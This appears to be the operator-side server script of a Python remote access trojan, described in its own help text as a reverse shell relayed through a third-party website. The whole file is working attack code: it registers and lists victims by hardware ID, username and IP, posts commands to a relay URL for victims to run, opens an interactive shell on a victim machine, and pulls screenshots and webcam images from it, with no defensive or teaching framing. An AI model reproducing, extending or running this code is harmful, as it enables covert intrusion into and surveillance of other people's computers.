import socket
import requests
from datetime import datetime
import os
import pygame.image
import traceback
import argparse
from tabulate import tabulate
import time

def shell(args):
    SERVER_HOST = args.host
    SERVER_PORT = args.port
    HWID = args.victim
    if not SERVER_HOST or not SERVER_PORT or not HWID:
        print("Require [-H HOST] [-p PORT] [-v VICTIM] ")
        print("TYPE 'python server.py -h' to retrieve more information")
        return

    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"
    # create a socket object
    requests.post("<YOUR 000webhost URL>/command.php",data={"hostname":SERVER_HOST, "port":SERVER_PORT, "getin":HWID})
    s = socket.socket()

    # bind the socket to all IP addresses of this host
    s.bind(("127.0.0.1", 443))

    s.listen(5)
    print("Listening as 127.0.0.1:443 ...")

    # accept any connections attempted
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)
    while True:
        try:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                r = requests.post("<YOUR 000webhost URL>/command.php",data={"hostname":"n", "port":"n", "getin":"n"})
                break
            elif command.lower() == "screenshot":
                if not os.path.exists(HWID): os.mkdir(HWID)
                with open(f"./{HWID}/{str(datetime.now()).replace(':', '_')}.png", "wb") as fwb:
                    img_buffer = client_socket.recv(BUFFER_SIZE)
                    while img_buffer[-5:] != b"<END>":
                        img_buffer += client_socket.recv(BUFFER_SIZE)
                    fwb.write(img_buffer)
                continue
            elif command.lower() == "webcam":
                if not os.path.exists(HWID): os.mkdir(HWID)
                img_buffer = client_socket.recv(BUFFER_SIZE)
                while img_buffer[-5:] != b"<END>":
                    img_buffer += client_socket.recv(BUFFER_SIZE)
                suface = pygame.image.fromstring(img_buffer[:-5], (640, 480), "RGBA")
                pygame.image.save(suface, f"./{HWID}/{str(datetime.now()).replace(':', '_')}.png")
                continue
            # retrieve command results
            output = client_socket.recv(BUFFER_SIZE).decode()
            while SEPARATOR not in output:
                output += client_socket.recv(BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # print output
            print(results)
        except Exception as e: traceback.print_exc()

def echo(args):
    VICTIMS = args.victim
    command = args.echo_commend
    if not VICTIMS or not command:
        print("Require [-cmd ECHO_COMMAND] [-v VICTIM] ")
        print("TYPE 'python server.py -h' to retrieve more information")
        return
    clear()
    print("sending command...")
    requests.post("<YOUR 000webhost URL>/command.php", data={"hostname":"n", "port":"n", "getin":"n", "username":VICTIMS, "echo":command})
    print("wait 70 sec for deleting command and retrieve result")
    time.sleep(60)
    requests.post("<YOUR 000webhost URL>/command.php", data={"hostname":"n", "port":"n", "getin":"n", "username":"n", "echo":"n"})
    data = requests.get("<YOUR 000webhost URL>/victims.json").json()
    table_list = []
    for victim in VICTIMS.split():
        table_list.append([victim, data[victim]["echo_reply"]])
    print(tabulate(table_list, headers=["HWID", "RESULT"], tablefmt="simple"))

def list_victim():
    r = requests.get("<YOUR 000webhost URL>/victims.json")
    data = r.json()
    table_list = []
    headers = ["HWID","USERNAME","IP","DATETIME"]
    for hwid in data:
        table_list.append([ hwid,
                            data[hwid]["username"],
                            data[hwid]["ip"],
                            data[hwid]["datetime"]])
    print(tabulate(table_list, headers = headers, tablefmt = "simple_grid"))

if __name__ == "__main__":
    clear = lambda: os.system('cls')
    mode_map = ["echo", "shell", "list"]
    parser = argparse.ArgumentParser(description='ez pz third site reverse shell')
    parser.add_argument("mode", type = str, choices=mode_map, help="selecting mode")
    parser.add_argument("-H", type = str, dest="host", help="type in your public hostname")
    parser.add_argument("-p", type = int, dest="port", help="type in your port")
    parser.add_argument("-v", type = str, dest="victim", help="type in victim's hwid to connect")
    parser.add_argument("-cmd", type = str, dest="echo_commend", help="type in echo command")
    args = parser.parse_args()
    if args.mode == "shell":
        shell(args)
    elif args.mode == "echo":
        echo(args)
    elif args.mode == "list":
        list_victim()